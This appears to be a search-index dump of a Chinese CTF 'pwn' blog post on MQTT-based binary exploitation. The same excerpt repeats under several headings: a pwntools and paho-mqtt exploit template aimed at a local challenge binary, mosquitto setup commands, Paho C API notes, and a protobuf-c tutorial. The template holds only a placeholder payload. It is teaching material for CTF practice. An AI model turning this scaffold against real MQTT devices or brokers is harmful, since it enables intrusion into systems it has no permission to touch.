:u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#api"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#例题"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#ciscn2025final_mqtt"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#湾区杯2024初赛"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#rwctf2022_who-moved-my-block"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * import paho.mqtt.client as mqtt context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() # ------------------------ MQTT 配置 ------------------------ MQTT_HOST = \"127.0.0.1\" MQTT_PORT = 9999 MQTT_TOPIC_PUB = \"diag/send\" MQTT_TOPIC_SUB = \"diag/resp\" client = mqtt.Client() def publish(topic,pl): result = client.publish(topic=topic, payload=pl) log.info(f\"MQTT Published: {payload}\") return result def on_connect(client, userdata, flags, rc): log.info(f\"MQTT Connected with code {rc}\") client.subscribe(MQTT_TOPIC_SUB) client.subscribe(\"#\") def on_message(client, userdata, msg): message = msg.payload.decode() log.info(f\"MQTT Received on {msg.topic}: {message}\") client.on_connect = on_connect client.on_message = on_message client.connect(MQTT_HOST, MQTT_PORT, keepalive=60) client.loop_start() # 发送示例 payload pl = b'aaaa' publish(MQTT_TOPIC_PUB,pl) itr() 基础知识\r配置环境\rsudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto 测试服务： 打开两个终端，终端1： mosquitto_sub -h localhost -t \"test/topic\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 订阅的主题（test/topic） 订阅（接收） 某个 MQTT 主题（test/topic）的消息。 只要有人往 test/topic 发布消息，这个终端就会打印出来。 终端2： mosquitto_pub -h localhost -t \"test/topic\" -m \"Hello MQTT\" 参数 说明 -h localhost 指定 MQTT Broker 的地址（这里是本机） -t \"test/topic\" 发布的目标主题 -m \"Hello MQTT\" 消息内容（payload） 发布（发送） 一条消息到 test/topic。 订阅了 test/topic 的客户端（如终端 A）会收到这条消息。 更改配置文件 sudo vim /etc/mosquitto/mosquitto.conf listener 9999 #设置监听端口为 9999 allow_anonymous true # 可选，允许匿名访问（默认） sudo systemctl restart mosquitto # 重启服务 之后 mosquitto_sub -h localhost -p 9999 -t \"test/topic\" mosquitto_pub -h localhost -p 9999 -t \"test/topic\" -m \"test\" Paho MQTT C\rPaho MQTT C 客户端是用 ANSI 标准 C 编写的功能齐全的 MQTT 客户端 Paho C 客户端包含四个变体库，包括共享库和静态库： paho-mqtt3a - 异步访问模式（asynchronous）(MQTTAsync) paho-mqtt3as - 带 SSL 的异步访问模式（asynchronous with SSL）(MQTTAsync) paho-mqtt3c - 同步访问模式（“classic” / synchronous）(MQTTClient) paho-mqtt3cs - 带 SSL 的同步访问模式（“classic” / synchronous with SSL）(MQTTClient) MQTTClient_create() MQTTClient_create( MQTTClient* handle, // 客户端句柄（输出参数） const char* serverURI, // MQTT Broker 地址 const char* clientId, // 客户端唯一标识符 int persistence_type, // 持久化类型 void* persistence_context // 持久化上下文（通常为 NULL） ); 此函数创建一个 MQTT 客户端，以便连接到指定的服务器并使用指定的持久性存储 MQTTClient_setCallbacks() void MQTTClient_setCallbacks( MQTTClient handle, // MQTT 客户端句柄 void* context, // 用户自定义上下文（传给回调函数） MQTTClient_connectionLost* cl, // 连接丢失回调 MQTTClient_messageArrived* ma, // 消息到达回调 MQTTClient_deliveryComplete* dc // 消息交付完成回调 ); typedef void MQTTClient_connectionLost(void* context, char* cause","date":"2026-02-02","objectID":"/posts/mqtt/:0:0","tags":null,"title":"Mqtt协议pwn","uri":"/posts/mqtt/#参考文章"},{"categories":["pwn"],"collections":null,"content":"安装使用\r安装： sudo apt-get update sudo apt-get install -y protobuf-compiler libprotobuf-dev sudo apt-get install libprotobuf-c-dev protobuf-c-compiler protoc-c –version用这句来验证是否安装完成 创建一个文件user.proto，写入： syntax = \"proto3\"; message User { int32 id = 1; string name = 2; string email = 3; } 使用以下命令生成C代码： protoc --c_out=. ./user.proto 这会在当前目录下生成两个文件：user.pb-c.h和user.pb-c.c user.pb-c.h：头文件，定义了消息类型（如User结构体）及其相关的函数。 user.pb-c.c：源文件，实现了这些函数，包含序列化和反序列化等操作。 $ tree . . ├── user.pb-c.c ├── user.pb-c.h └── user.proto 0 directories, 3 files 在C程序中，需要包含生成的user.pb-c.h头文件，这样就可以使用User消息类型及其相关的protobuf操作函数。 打个比方 //pwn.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \"user.pb-c.h\" // 包含生成的头文件 int main() { // 创建一个 User 对象，并初始化 User user = USER__INIT; // 生成的宏用于初始化User结构体 user.id = 123; // 设置用户ID user.name = \"John Doe\"; // 设置用户名 user.email = \"john.doe@example.com\"; // 设置用户邮箱 // 序列化消息 size_t serialized_size = user__get_packed_size(\u0026user); // 获取序列化消息所需的大小 void *buffer = malloc(serialized_size); // 分配内存存放序列化数据 user__pack(\u0026user, buffer); // 序列化数据到buffer printf(\"Serialized User data to %zu bytes\\n\", serialized_size); // 反序列化消息 User *new_user = user__unpack(NULL, serialized_size, buffer); // 从二进制数据反序列化为User对象 if (new_user == NULL) { fprintf(stderr, \"Error unpacking User message\\n\"); return 1; } // 输出解包后的User数据 printf(\"ID: %d\\n\", new_user-\u003eid); printf(\"Name: %s\\n\", new_user-\u003ename); printf(\"Email: %s\\n\", new_user-\u003eemail); // 清理内存 user__free_unpacked(new_user, NULL); // 释放反序列化后的对象 free(buffer); // 释放序列化的缓冲区内存 return 0; } 然后对其进行编译 gcc -o pwn user.pb-c.c pwn.c -lprotobuf-c 在这个命令中： user.pb-c.c 是由 protoc 生成的 C 源文件。 your_program.c 是编写的包含主程序的 C 文件。 -lprotobuf-c 指定链接 